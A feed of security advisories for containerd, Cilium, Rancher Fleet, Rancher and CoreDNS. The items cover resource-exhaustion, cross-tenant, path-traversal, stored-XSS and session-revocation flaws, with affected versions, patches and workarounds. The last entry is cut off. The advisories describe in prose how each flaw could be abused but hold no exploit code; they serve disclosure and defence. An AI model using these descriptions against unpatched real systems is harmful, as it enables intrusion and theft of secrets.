channel.title: VulnFeed — Security Advisories
channel.description: Aggregated security advisories from GitHub repositories

item.title: [MEDIUM] go:github.com/containerd/containerd — Containerd has image-pull DoS via crafted OCI index graph amplification (CVE-2026-53493)
item.description:
CVE-2026-53493 · CVSS 6.9 (CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N) · CWE-400, CWE-770, CWE-834
Affected: - go/github.com/containerd/containerd/v2 >= 2.0.0, < 2.0.13 (patched: 2.0.13) - go/github.com/containerd/containerd <= 1.7.35 (patched: 1.7.36) - go/github.com/containerd/containerd/v2 >= 2.1.0, < 2.2.9 (patched: 2.2.9) - go/github.com/containerd/containerd/v2 >= 2.3.0, < 2.3.6 (patched: 2.3.6) - go/github.com/containerd/containerd/v2 = 2.4.0 (patched: 2.4.1)
---
### Impact
A vulnerability exists in containerd's image pull handlers where a crafted OCI image index containing deeply nested or heavily fanned-out descriptor graphs can cause unbounded CPU and memory consumption. During the `PullImage` operation, the recursive traversal and processing of child descriptors lack sufficient depth and breadth limits, and fail to adequately deduplicate identical descriptors. This unbounded traversal leads to excessive resource allocation.
Consequently, pulling a malicious image reference can result in prolonged stalls during container creation and significant resource pressure on the host system. This issue occurs entirely during the image pull phase, prior to any container execution.
### Patches
This bug has been fixed in containerd 2.4.1, 2.3.6, 2.2.9, 2.0.13, and 1.7.36. Users should update to these versions to resolve the issue.
### Workarounds
There are no known workarounds for this issue. Users are advised to only pull trusted images from known registries until the patch can be applied.
### Credits
The containerd project would like to thank Jakub Ciolek at ElevenLabs and @jlgore who independently discovered and responsibly disclosed this issue in accordance with the [containerd security policy](https://github.com/containerd/project/blob/main/SECURITY.md).
### For more information
If you have any questions or comments about this advisory:
* Open an issue in [containerd](https://github.com/containerd/containerd/issues/new/choose) * Email us at [security@containerd.io](mailto:security@containerd.io)
To report a security issue in containerd: * [Report a new vulnerability](https://github.com/containerd/containerd/security/advisories/new) * Email us at [security@containerd.io](mailto:security@containerd.io)

item.title: [MEDIUM] go:github.com/cilium/cilium — Cilium: Namespaced HTTPRoutes can redirect traffic to other namespaces (CVE-2026-56742)
item.description:
CVE-2026-56742 · CVSS 5.9 (CVSS:3.1/AV:A/AC:L/PR:H/UI:N/S:C/C:L/I:L/A:L) · CWE-862
Affected: - go/github.com/cilium/cilium < 1.17.17 (patched: 1.17.17) - go/github.com/cilium/ciliumCilium >= 1.18.0, < 1.18.11 (patched: 1.18.11) - go/github.com/cilium/cilium >= 1.19.0, < 1.19.5 (patched: 1.19.5)
---
### Impact
In Cilium clusters using [Gateway API](https://docs.cilium.io/en/stable/network/servicemesh/gateway-api/gateway-api/), users with permissions to create or update namespaced HTTPRoutes can mirror HTTP traffic to any Service in any namespace, bypassing the ReferenceGrant authorization mechanism.
Gateway API functionality is disabled by default.
### Patches
This issue affects:
* Cilium v1.19 from v1.19.0 to v1.19.4 inclusive * Cilium v1.18 from v1.18.0 to v1.18.10 inclusive * All versions of Cilium before v1.17.17
This issue is patched in:
* Cilium v1.19.5 * Cilium v1.18.11 * Cilium v1.17.17
### Workarounds
There is no workaround to this issue. Users of this feature who are unable to upgrade can mitigate the risk by ensuring that RBAC permissions to create `HTTPRoute` objects are only granted to cluster admins.
### Acknowledgements
The Cilium community has worked together with members of Isovalent to prepare these mitigations. Special thanks to @galanko for reporting the issue and @mhofstetter for their work on triaging and remediating this issue.
### For more information
If you have any questions or comments about this advisory, please reach out on [Slack](https://docs.cilium.io/en/latest/community/community/).
If you think you have found a vulnerability affecting Cilium, we strongly encourage you to report it to our security mailing list at [security@cilium.io](mailto:security@cilium.io). This is a private mailing list for the Cilium security team, and your report will be treated as top priority.

item.title: [HIGH] rancher/fleet — Fleet applies namespace labels and annotations without the bundle's service account privileges (CVE-2026-93540)
item.description:
CVE-2026-93540 · CVSS 7.1 (CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N) · CWE-269, CWE-863
Affected: - github.com/rancher/fleet >=v0.16.0, <v0.16.1 (patched: v0.16.1) - github.com/rancher/fleet >=v0.15.0, <v0.15.7 (patched: v0.15.7) - github.com/rancher/fleet >=v0.14.0, <v0.14.11 (patched: v0.14.11) - github.com/rancher/fleet >=v0.13.0, <v0.13.16 (patched: v0.13.16)
---
### Impact
A privilege mismatch was found in Fleet. When a bundle requested namespace labels or annotations through the `namespaceLabels` and `namespaceAnnotations` options, the resulting namespace metadata update was not subject to the same authorization as the rest of the bundle's deployment. As a result, a bundle could change labels and annotations on a target namespace even when the identity it was pinned to was not authorized to modify that namespace.
In multi-tenant deployments, namespace labels and annotations are frequently consumed by cluster-level controllers and policy engines, so unauthorized changes to them can weaken the security posture an administrator configured for a namespace. The issue does not expose confidential data and does not directly affect the availability of running workloads.
**Note:** Only deployments that rely on Fleet's multi-tenant model are affected, that is, deployments where bundles are pinned to a service account either directly on the bundle or through a `Policy` with `requireServiceAccount` and `allowedServiceAccounts`. In operator mode, where no service account is pinned, bundles deploy with the Fleet agent's own credentials by design and this authorization boundary does not apply.
### Patches
The namespace update that applies `namespaceLabels` and `namespaceAnnotations` after a deployment now runs as the deployment's service account, resolved through the same impersonation path already used for the deployment itself. Reads and updates of the target namespace are therefore gated by the same downstream Kubernetes RBAC as every other action the bundle performs. There is no longer a configuration in which the deployment is impersonated but the namespace metadata update is not.
In a follow-up change, the previously introduced `pod-security.kubernetes.io/` label filter was removed in Fleet v0.16.2, v0.15.7, v0.14.11, and v0.13.16. That filter prevented operators from legitimately setting Pod Security Standards labels through `namespaceLabels`; the authorization decision is now made by cluster RBAC instead of by a prefix blocklist. No equivalent annotation blocklist was added, for the same reason.
**Upgrade action:** In multi-tenant deployments, a bundle that previously relied on Fleet's elevated credentials to set namespace labels or annotations will now fail if its pinned service account lacks `get` and `update` permissions on the target namespace. Administrators should either pre-create and configure such namespaces themselves, or explicitly grant the tenant service account the required namespace permissions if tenants are intended to control namespace metadata.
Patched versions of Fleet include releases v0.16.1, v0.15.7, v0.14.11, and v0.13.16.
Patched versions of Rancher include releases v2.15.1, v2.14.6, v2.13.10, and v2.12.14.
### Workarounds
For users who cannot upgrade to a patched version:
1. **Restrict who can deploy through Fleet.** On affected versions, the service account a bundle is pinned to does not limit namespace label and annotation changes, so restricting that service account's permissions does not mitigate this issue. Limit permission to create or modify `GitRepo`, `HelmOp`, and `Bundle` resources, and control which git repositories and Helm sources Fleet is configured to use, so that only trusted content reaches a cluster.
2. **Block namespace metadata changes by the Fleet agent.** On affected versions, the namespace update is made with the Fleet agent's own identity, not with the tenant's service account. An admission or policy controller can reject or alert on label and annotation changes on tenant namespaces made by that identity:
- `system:serviceaccount:cattle-fleet-system:fleet-agent` on downstream clusters - `system:serviceaccount:cattle-fleet-local-system:fleet-agent` on the Rancher local cluster
Bundles that legitimately use `namespaceLabels` or `namespaceAnnotations` on those namespaces will fail to deploy while such a policy is in place. In Rancher, the rancher-webhook `updatepsa` check does not prevent this issue on affected versions, because the Fleet agent's identity passes that check.
After upgrading, verify that tenant service accounts only hold the namespace permissions you intend, for example:
```bash kubectl auth can-i update namespaces \ --as=system:serviceaccount:<agent-namespace>:<tenant-service-account> ```
### References
- [rancher/fleet#5351](https://github.com/rancher/fleet/pull/5351) (main) - [rancher/fleet#5415](https://github.com/rancher/fleet/pull/5415) (release/v0.16) - [rancher/fleet#5657](https://github.com/rancher/fleet/pull/5657) (release/v0.15) - [rancher/fleet#5662](https://github.com/rancher/fleet/pull/5662) (release/v0.14) - [rancher/fleet#5663](https://github.com/rancher/fleet/pull/5663) (release/v0.13) - [CWE-269: Improper Privilege Management](https://cwe.mitre.org/data/definitions/269.html) - [CWE-863: Incorrect Authorization](https://cwe.mitre.org/data/definitions/863.html)
### For more information
If you have any questions or comments about this advisory:
- Reach out to the [SUSE Rancher Security team](https://github.com/rancher/rancher/security/policy) for security related inquiries. - Open an issue in the [Rancher](https://github.com/rancher/rancher/issues/new/choose) repository. - Verify our [support matrix](https://www.suse.com/suse-rancher/support-matrix/all-supported-versions/) and [product support life cycle](https://www.suse.com/lifecycle/).

item.title: [MEDIUM] rancher/fleet — Unauthenticated GitRepo Spec Mutation via Fleet Git Webhook Receiver (CVE-2026-93539)
item.description:
CVE-2026-93539 · CVSS 6.3 (CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:L/VA:L/SC:N/SI:L/SA:L) · CWE-306, CWE-862
Affected: - github.com/rancher/fleet >=v0.16.0, <v0.16.2 (patched: v0.16.2)
---
### Impact
A vulnerability was discovered in Fleet's Git webhook receiver (the `gitjob` webhook service). When a webhook secret is not configured, incoming webhook requests are accepted without verification, and processing a request can change the `spec.pollingInterval` field of a matching `GitRepo` resource in any namespace. A caller with network access to the webhook service and no Kubernetes credentials can therefore alter `GitRepo` configuration outside the namespaces they are authorized for.
The practical impact is limited to integrity and availability of Fleet's Git polling behavior: the affected `GitRepo` has its polling interval set to one hour, which can delay the rollout of legitimate Git changes, and each request causes additional Git operations against the configured Git host. The content that Fleet deploys is not affected, because the controller always re-resolves the actual remote commit before deploying, and no data is disclosed.
**Note:** Only deployments where the webhook secret is not in use are affected. Fleet does not configure a webhook secret by default: the Fleet Helm chart does not create the global `gitjob-webhook` Secret, and `GitRepo.spec.webhookSecret` is empty unless explicitly set. Deployments that configure a webhook secret are not affected, because unverified requests are rejected in that case.
Only Fleet v0.16.0 and v0.16.1 (shipped with release line Rancher v2.15.0 and v2.15.1 respectively) are affected. Earlier Fleet release lines do not perform this `spec` mutation and were verified as not vulnerable.
### Patches
Fleet now confines the webhook-triggered mutation of `GitRepo.spec` to requests that have been successfully verified against either `GitRepo.spec.webhookSecret` or the global `gitjob-webhook` Secret. Unverified requests can no longer set the default polling interval on a `GitRepo`. This is not a breaking change and no manual action is required after upgrading, beyond the upgrade itself.
Patched versions of Fleet include release v0.16.2.
Patched versions of Rancher include release v2.15.2, all other release lines are unaffected.
### Workarounds
For users who cannot upgrade immediately:
1. **Configure a webhook secret.** Set a secret for the Git webhook receiver, either per repository through `GitRepo.spec.webhookSecret` or globally through the `gitjob-webhook` Secret in the Fleet controller namespace (`cattle-fleet-system` by default). When a secret is present, unverified webhook requests are rejected. 2. **Set an explicit polling interval.** Setting `spec.pollingInterval` explicitly on each `GitRepo` prevents the value from being changed through this path. 3. **Restrict network access to the webhook service.** If the Git webhook receiver is not used, do not expose the `gitjob` service outside the cluster, and apply a `NetworkPolicy` restricting access to the webhook port to trusted sources only. When the receiver is used, place it behind an authenticated or source-restricted ingress.
### References
- [rancher/fleet#5781](https://github.com/rancher/fleet/pull/5781) - [rancher/fleet#5782](https://github.com/rancher/fleet/pull/5782) - [CWE-306: Missing Authentication for a Critical Function](https://cwe.mitre.org/data/definitions/306.html) - [CWE-862: Missing Authorization](https://cwe.mitre.org/data/definitions/862.html)
### For more information
If you have any questions or comments about this advisory:
- Reach out to the [SUSE Rancher Security team](https://github.com/rancher/rancher/security/policy) for security related inquiries. - Open an issue in the [Rancher](https://github.com/rancher/rancher/issues/new/choose) repository. - Verify our [support matrix](https://www.suse.com/suse-rancher/support-matrix/all-supported-versions/) and [product support life cycle](https://www.suse.com/lifecycle/).

item.title: [HIGH] rancher/fleet — Cross-tenant BundleDeployment and Secret disclosure via spoofed cluster labels during agent-initiated registration in Fleet (CVE-2026-93538)
item.description:
CVE-2026-93538 · CVSS 7.1 (CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:H/VI:L/VA:N/SC:H/SI:L/SA:N) · CWE-290, CWE-639, CWE-863
Affected: - go/github.com/rancher/fleet >=v0.16.0, <v0.16.1 (patched: v0.16.1) - go/github.com/rancher/fleet >=v0.15.0, <v0.15.6 (patched: v0.15.6) - go/github.com/rancher/fleet >=v0.14.0, <v0.14.10 (patched: v0.14.10) - go/github.com/rancher/fleet >=v0.13.0, <v0.13.15 (patched: v0.13.15) - go/github.com/rancher/fleet >=v0.12.0, <v0.12.19 (patched: v0.12.19)
---
### Impact
A cross-tenant authorization issue was discovered in Fleet. During **agent-initiated** cluster registration, cluster labels supplied by the registering agent, including labels in the reserved `management.cattle.io/` namespace such as the cluster display name label, were applied to the resulting upstream `Cluster` object. Because Fleet resolves `GitRepo` and `Bundle` targets from those cluster labels, a party able to register a cluster into a Fleet workspace namespace shared with other tenants could cause its own cluster to satisfy targeting rules that administrators intended for a different cluster.
When that happens, Fleet creates a `BundleDeployment` and the associated resolved options/values Secret in the registering cluster's own namespace, where its agent is entitled to read them. The security outcome is disclosure of another tenant's bundle manifests and of resolved Helm values, including values sourced through `valuesFrom` Secrets, plus deployment of that tenant's intended workload onto a cluster the other tenant does not control. The victim tenant's own deployment is not modified or removed.
**Preconditions:**
Exploitation of this security vulnerability requires the following conditions:
- The deployment must use **agent-initiated** cluster registration. Fleet copies agent-supplied labels only when it creates the `Cluster` object as part of that flow. - Standalone Rancher deployments are **not** affected in their default configuration, because Rancher uses manager-initiated registration and creates the Fleet `Cluster` object in advance. - Multiple trust domains must share a single Fleet registration namespace (for example, several tenants registering into `fleet-default`), and the affected `Bundle`/`GitRepo` must target clusters by label or by cluster name. - `IgnoreClusterRegistrationLabels` must be left at its default value of `false`.
### Patches
Fleet now discards reserved label keys supplied by an agent during agent-initiated cluster registration, so labels in the reserved `management.cattle.io/` namespace, including the cluster display name label used for name-based targeting, can no longer be self-asserted by a registering agent. Such labels are only honored when set by the management plane after registration. Target resolution therefore no longer matches on values that a registering agent controls.
Patched versions of Fleet include releases v0.16.1, v0.15.6, v0.14.10, v0.13.15, and v0.12.19.
Patched versions of Rancher include releases v2.15.1, v2.14.5, v2.13.9, v2.12.13, and v2.11.17.
This change is not expected to be breaking. Environments that intentionally rely on an agent setting a reserved label at install time must instead apply that label to the `Cluster` object from the management plane after registration.
### Workarounds
Organizations that are unable to upgrade immediately, please follow *any* of the options below to reduce exposure:
1. **Use one Fleet workspace per trust domain.** Register each tenant's clusters into a dedicated workspace namespace so that a cluster can never match another tenant's targets. A shared registration namespace should be treated as a shared trust domain. 2. **Disable copying of registration labels.** Set `ignoreClusterRegistrationLabels=true` (Helm value `ignoreClusterRegistrationLabels` on the Fleet controller chart) so agent-supplied labels are not applied to the `Cluster` object. Labels required for targeting must then be applied by an administrator after registration. 3. **Use manager-initiated registration.** Have the management plane create the Fleet `Cluster` object in advance, as Rancher does by default; agent-supplied labels are not copied in that flow. 4. **Restrict registration tokens.** Treat cluster registration tokens as sensitive, limit their distribution, and rotate them where they may have been shared across trust domains. 5. **Review existing clusters.** Inspect `Cluster` objects in shared workspace namespaces for unexpected or duplicated reserved labels, in particular duplicated cluster display name values, and remove any that were not set by an administrator.
### References
- [CWE-290: Authentication Bypass by Spoofing](https://cwe.mitre.org/data/definitions/290.html) - [CWE-639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html) - [CWE-863: Incorrect Authorization](https://cwe.mitre.org/data/definitions/863.html)
### For more information
If you have any questions or comments about this advisory:
- Reach out to the [SUSE Rancher Security team](https://github.com/rancher/rancher/security/policy) for security related inquiries. - Open an issue in the [Rancher](https://github.com/rancher/rancher/issues/new/choose) repository. - Verify our [support matrix](https://www.suse.com/suse-rancher/support-matrix/all-supported-versions/) and [product support life cycle](https://www.suse.com/lifecycle/).

item.title: [HIGH] rancher/fleet — Path traversal in Fleet Helm valuesFiles allows disclosure of files outside the bundle directory (CVE-2026-93537)
item.description:
CVE-2026-93537 · CVSS 7.0 (CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N) · CWE-22, CWE-200
Affected: - go/github.com/rancher/fleet >=v0.16.0, <v0.16.2 (patched: v0.16.2) - go/github.com/rancher/fleet >=v0.15.0, <v0.15.7 (patched: v0.15.7) - go/github.com/rancher/fleet >=v0.14.0, <v0.14.11 (patched: v0.14.11) - go/github.com/rancher/fleet >=v0.13.0, <v0.13.16 (patched: v0.13.16) - go/github.com/rancher/fleet >=v0.12.0, <v0.12.20 (patched: v0.12.20)
---
### Impact
A security vulnerability was discovered in Fleet's handling of the Helm `valuesFiles` setting in `fleet.yaml`. Entries in that list were not confined to the bundle directory, so a bundle could reference files located outside the Git repository content that Fleet checked out.
A user who can supply bundle content to a repository referenced by a `GitRepo` resource, for example through Git push access, or through permission to create or modify a `GitRepo`, can cause Fleet to read files from the filesystem of the environment that processes the bundle and include their contents in the generated `Bundle` resource. This can expose configuration or credential material that the user has no Kubernetes RBAC permission to read, including Helm registry credentials made available to the bundle-processing job when per-path Helm credentials are configured.
Disclosure is limited to files whose contents parse as a YAML or JSON mapping. Integrity and availability of managed clusters are not affected.
#### Preconditions
Exploitation of this security vulnerability requires the following conditions:
- Fleet must reconcile a `GitRepo` whose bundle content is not fully trusted, for example when repository write access extends beyond the administrators of the management cluster, or when users may create their own `GitRepo` resources. - Only bundles that use Helm `valuesFiles` (including `targetCustomizations[].helm.valuesFiles`) are affected.
> [!NOTE] > The highest confidentiality impact applies where the affected `GitRepo` uses per-path Helm credentials (`helmSecretNameForPaths`), because that credential material is made available to the bundle-processing job.
### Patches
The fix constrains Helm `valuesFiles` entries to the bundle directory. Paths that resolve outside the bundle root are rejected before any file is read, and the affected `GitRepo` reports an error instead of producing a bundle. This is a behavior change for bundles that relied on referencing values files outside the bundle directory; such bundles must be updated to keep their values files inside the bundle directory.
Patched versions of Fleet include releases v0.16.2, v0.15.7, v0.14.11, v0.13.16, and v0.12.20.
Patched versions of Rancher include releases v2.15.2, v2.14.6, v2.13.10, v2.12.14, and v2.11.18.
### Workarounds
No workaround exists other than upgrading to a patched version. Organizations unable to upgrade immediately can reduce exposure by:
- Restricting write access to repositories referenced by Fleet `GitRepo` resources to trusted administrators. - Restricting, through RBAC, which users may create or modify `GitRepo` resources, so that only reviewed repositories are reconciled. - Reviewing bundles for `helm.valuesFiles` entries that point outside the bundle directory. - Limiting the use of per-path Helm credentials (`helmSecretNameForPaths`) to `GitRepo` resources whose content is fully trusted.
### References
- [CWE-22: Improper Limitation of a Pathname to a Restricted Directory](https://cwe.mitre.org/data/definitions/22.html) - [CWE-200: Exposure of Sensitive Information to an Unauthorized Actor](https://cwe.mitre.org/data/definitions/200.html)
### For more information
If you have any questions or comments about this advisory:
- Reach out to the [SUSE Rancher Security team](https://github.com/rancher/rancher/security/policy) for security related inquiries. - Open an issue in the [Rancher](https://github.com/rancher/rancher/issues/new/choose) repository. - Verify our [support matrix](https://www.suse.com/suse-rancher/support-matrix/all-supported-versions/) and [product support life cycle](https://www.suse.com/lifecycle/).

item.title: [CRITICAL] rancher/fleet — Fleet agent copies downstream resources with cluster-admin privileges, allowing cross-namespace writes on downstream clusters (CVE-2026-88808)
item.description:
CVE-2026-88808 · CVSS 9.0 (CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H) · CWE-269, CWE-863
Affected: - go/github.com/rancher/fleet >=v0.16.0, <v0.16.2 (patched: v0.16.2) - go/github.com/rancher/fleet >=v0.15.0, <v0.15.7 (patched: v0.15.7) - go/github.com/rancher/fleet >=v0.14.0, <v0.14.11 (patched: v0.14.11)
---
### Impact
A vulnerability has been identified within Rancher Manager where the Fleet agent wrote resources to downstream clusters using its own cluster-admin credentials instead of the ServiceAccount pinned to the deployment. It affects multi-tenancy environments where different tenants share the same downstream clusters, for example different privileged or untrusted teams inside the same organization.
Fleet copies the Secrets and ConfigMaps listed in a Bundle's `downstreamResources` from the Bundle's namespace on the management cluster into the deployment's target namespace on every targeted downstream cluster. On affected versions where the agent performed that copy, and created the target namespace when it did not exist without impersonating the deployment's ServiceAccount, while every other part of the deployment, including the Helm install and the namespace creation Helm performs as part of it, was already gated by that account. The target namespace of a deployment is under the control of the user who creates the Fleet resource, so these writes were not confined to the namespaces that user is otherwise entitled to.
This issue enables a malicious tenant who can create a Bundle, GitRepo or HelmOp in a Fleet namespace to write or overwrite a Secret or ConfigMap of any name, with content they control, in any namespace of every downstream cluster their resource targets, and to have that namespace created if it does not exist. The previous contents of an overwritten object are not disclosed, so the impact comes from what that object is used for: overwriting an image pull secret which can redirect another tenant's image pulls to a registry the attacker controls, and overwriting a TLS or database secret, or a ConfigMap consumed by a co-tenant or a system component, can compromise or disrupt that workload.
Customers who run Fleet in a multi-tenant environment and cannot rule out exposure are advised to review the Secrets and ConfigMaps on their downstream clusters for objects they did not expect, in particular image pull secrets, and for namespaces that were created unexpectedly. Objects written by this path carry the label `fleet.cattle.io/bundledeployment`, naming the Bundle deployment that wrote them, which identifies both the objects and the Fleet resource responsible. Deployments that never became ready should be included in that review, because the copy happens before the Helm installation. Rotate any credentials that may have been replaced, and confirm that workloads pulling images with a reviewed pull secret are running the images you expect.
### Patches
This vulnerability is addressed by performing the downstream writes as the ServiceAccount pinned to the deployment. Creating the target namespace and writing the copied Secrets and ConfigMaps now run as that account, so the tenant's downstream RBAC gates them, in the same way it already gated the Helm deploy path. Removing the copies again when the release is deleted remains an agent operation: the objects are selected by the ownership label Fleet writes on them, so the cleanup only ever touches objects Fleet created. Reading the source objects still runs as the agent, because those reads go to the management cluster, where the downstream ServiceAccount is not a valid identity. When the ServiceAccount is not allowed to create the namespace or write the copied objects, the copy is denied before anything is installed, and the deployment reports “not ready” and retries until the missing permission is granted.
The protection depends on a ServiceAccount being pinned to the deployment. When no ServiceAccount resolves, the copy falls back to the agent's own credentials, which preserves the behavior of existing single-tenant installations. To benefit from the fix in a multi-tenant setup, pin a least privilege ServiceAccount and enforce it with a Policy that sets `requireServiceAccount` in each tenant namespace, then grant that account only the namespaces and objects the deployment legitimately writes.
Patched versions of Fleet include releases v0.16.2, v0.15.7, and v0.14.11.
Patched versions of Rancher include releases v2.15.2, v2.14.6 and v2.13.10.
### Workarounds
If you can't upgrade to a fixed version, please make sure that you apply these workarounds:
On Rancher v2.13 and v2.14, leave `EXPERIMENTAL_COPY_RESOURCES_DOWNSTREAM` unset or set it to false. The feature is disabled by default on those releases, and while it is disabled the affected code path does not run at all, which fully mitigates the issue there.
On all affected releases, restrict through RBAC on the management cluster who may create or modify Bundle, GitRepo and HelmOp resources in Fleet namespaces, so that only trusted administrators can reach downstream clusters this way, and do not let tenants that do not trust each other share the same downstream clusters. Restricting the tenant's ServiceAccount on the downstream cluster does not help before the patch, because the affected path did not use it.
### References
- [rancher/fleet#5787](https://github.com/rancher/fleet/pull/5787) - [rancher/fleet#5788](https://github.com/rancher/fleet/pull/5788) - [rancher/fleet#5789](https://github.com/rancher/fleet/pull/5789) - [rancher/fleet#5790](https://github.com/rancher/fleet/pull/5790) - [CWE-863: Incorrect Authorization](https://cwe.mitre.org/data/definitions/863.html) - [CWE-269: Improper Privilege Management](https://cwe.mitre.org/data/definitions/269.html)
### For more information
If you have any questions or comments about this advisory:
- Reach out to the [SUSE Rancher Security team](https://github.com/rancher/rancher/security/policy) for security related inquiries. - Open an issue in the [Rancher](https://github.com/rancher/rancher/issues/new/choose) repository. - Verify our [support matrix](https://www.suse.com/suse-rancher/support-matrix/all-supported-versions/) and [product support life cycle](https://www.suse.com/lifecycle/).

item.title: [CRITICAL] rancher/rancher — Unauthenticated update of public UI settings leading to stored cross-site scripting in Rancher (CVE-2026-88804)
item.description:
CVE-2026-88804 · CVSS 9.4 (CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H) · CWE-79, CWE-862
Affected: - go/github.com/rancher/rancher >=v2.15.0, <v2.15.2 (patched: v2.15.2) - go/github.com/rancher/rancher >=v2.14.0, <v2.14.6 (patched: v2.14.6) - go/github.com/rancher/rancher >=v2.13.0, <v2.13.10 (patched: v2.13.10) - go/github.com/rancher/rancher >=v2.12.0, <v2.12.14 (patched: v2.12.14) - go/github.com/rancher/rancher >=v2.11.0, <v2.11.18 (patched: v2.11.18)
---
### Impact
A security vulnerability exists in the Rancher Manager API routes that serve a small set of public UI settings without authentication. These routes were intended to be read-only, but a request-parsing behavior in the underlying Norman API framework allowed a remote, unauthenticated user with network access to the Rancher server to modify the values of those public settings.
Because one of these settings is rendered as raw HTML on the Rancher login page, an unauthenticated attacker could persist attacker-controlled content that is then executed in the browser of any user who opens the login page, in the Rancher origin. This can lead to disclosure of the local administrator bootstrap password or hijacking of an active administrator session, and therefore to full administrative control of the Rancher installation and of the downstream clusters it manages.
#### Preconditions
- The attacker requires network access to the Rancher server endpoint. No Rancher account, credentials, or prior privileges are required. - A legitimate user must subsequently open the Rancher login page for the stored content to take effect. No other deliberate action from that user is required.
> [!NOTE] > Deployments in a default configuration are affected; no non-default feature or setting needs to be enabled.
### Patches
The fix hardens the unauthenticated Rancher API router so that the public settings endpoints are strictly read-only. Request parameters that could reinterpret the effective HTTP method of a request are now stripped before the request reaches the management API handler, so requests to these unauthenticated routes can no longer result in a write to a setting.
The change is server-side only and does not alter the values or behavior of the settings themselves, so no user action beyond upgrading is required.
Patched versions of Rancher include releases v2.15.2, v2.14.6, v2.13.10, v2.12.14, and v2.11.18.
Administrators who suspect their installation was targeted before upgrading should review the current values of the public UI settings (for example `ui-pl`, `first-login`, `ui-banners`, `ui-brand`, `ui-issues`, and `ui-default-landing`) and restore any unexpected values, rotate the local administrator password, and invalidate existing administrator tokens and sessions.
### Workarounds
No workaround fully addresses the issue other than upgrading to a patched version. Users who cannot upgrade immediately can reduce exposure by:
- Restricting network access to the Rancher server endpoint to trusted networks and clients. - Placing Rancher behind a reverse proxy, WAF, or ingress policy that rejects requests to the unauthenticated `/v3/settings/*` endpoints carrying HTTP method-override parameters or request bodies, allowing only plain read requests. - Monitoring the values of the public UI settings listed above for unexpected changes.
### Credits
This vulnerability was originally discovered and reported by [@StopWar](https://x.com/st0pw4r).
### For more information
If you have any questions or comments about this advisory:
- Reach out to the [SUSE Rancher Security team](https://github.com/rancher/rancher/security/policy) for security related inquiries. - Open an issue in the [Rancher](https://github.com/rancher/rancher/issues/new/choose) repository. - Verify our [support matrix](https://www.suse.com/suse-rancher/support-matrix/all-supported-versions/) and [product support life cycle](https://www.suse.com/lifecycle/).

item.title: [HIGH] rancher/rancher — Session Not Revoked Server-Side on Logout in Rancher (CVE-2026-88805)
item.description:
CVE-2026-88805 · CVSS 7.4 (CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:A/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N) · CWE-287, CWE-613
Affected: - go/github.com/rancher/rancher >=v2.15.0, <v2.15.2 (patched: v2.15.2)
---
### Impact
A session revocation vulnerability exists in Rancher's logout handling for public API session tokens. When a user logs out of the Rancher UI, the browser session cookies are cleared, but the corresponding server-side session token is not removed from its backing store. As a result, the session token remains valid and continues to authenticate API requests until its configured time-to-live or idle timeout expires.
Logout is the primary control available to users and administrators to immediately terminate a session that is suspected to be compromised. Because this control does not take effect server-side, a session that a user believes to have been terminated can still be used.
**Preconditions**
Exploitation of this issue requires the following conditions:
1. Rancher is configured with an authentication provider that issues external session tokens (for example, OIDC-based providers such as Generic OIDC, Keycloak, or Azure AD). 2. The attacker has already obtained a valid session token belonging to the victim through a separate means outside this flaw (for example, client-side compromise, or leakage through an intermediary proxy, cache, or log). 3. The victim subsequently logs out, expecting the session to be revoked.
An attacker who meets these prerequisites retains authenticated access with the victim's identity and permissions, including administrative privileges where applicable, for the remaining lifetime of the token, despite the victim's logout.
Deployments that do not use public API session tokens are not affected; legacy Rancher API tokens are revoked correctly on logout.
### Patches
The fix corrects the internal routing of the session token identifier during logout. The logout handler now passes the fully qualified token identifier to the token deletion logic, so public API session tokens are deleted from the correct backing store instead of being silently treated as legacy tokens. The deletion path also logs cases where the requested token is not found, so that misrouted deletions are no longer invisible.
Unit test coverage was added for the public API session token logout path, which was previously exercised only for legacy tokens.
This change is not a breaking change and requires no user action beyond upgrading. Sessions issued before the upgrade are revoked normally once the patched version is running.
Rancher v2.15.2 includes the fix for this issue.
### Workarounds
There is no complete workaround other than upgrading to a patched version.
If organizations are unable to upgrade immediately, some partial mitigations are:
- Reduce the session token time-to-live and idle timeout settings in Rancher so that a session that is not revoked at logout expires sooner. - Administrators can delete the affected user's active session tokens directly (for example, by removing the user's tokens through the Rancher API or by disabling the user account) when immediate revocation is required. - Follow standard session-protection practices — enforce TLS end to end, avoid logging or caching authorization headers at intermediary proxies, and restrict the use of untrusted browser extensions on workstations used to administer Rancher — to reduce the likelihood of a session token being captured in the first place.
### References
- [rancher/rancher#57294](https://github.com/rancher/rancher/pull/57294) — fix deletion misrouting, plus unit tests - [rancher/rancher#57293](https://github.com/rancher/rancher/pull/57293) — fix deletion misrouting, plus unit tests (release/v2.15)
### For more information
If you have any questions or comments about this advisory:
- Reach out to the [SUSE Rancher Security team](https://github.com/rancher/rancher/security/policy) for security related inquiries. - Open an issue in the [Rancher](https://github.com/rancher/rancher/issues/new/choose) repository. - Verify our [support matrix](https://www.suse.com/suse-rancher/support-matrix/all-supported-versions/) and [product support life cycle](https://www.suse.com/lifecycle/).

item.title: [HIGH] go:github.com/coredns/coredns — CoreDNS DoH/DoQ/gRPC bypass UPDATE rejection enforced on UDP/TCP (CVE-2026-86003)
item.description:
CVE-2026-86003 · CVSS 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N) · CWE-441
Affected: - go/github.com/coredns/coredns <= 1.14.6 (patched: 1.14.7)
---
### Summary
CoreDNS accepted [RFC 2136](https://datatracker.ietf.org/doc/html/rfc2136) UPDATE messages over DoH, DoH3, DoQ, and DNS-over-gRPC, then allowed the `proxy`/`forward` plugin to send them unchanged to an upstream DNS server. UDP, TCP, and DoT rejected the same opcode before plugin dispatch.
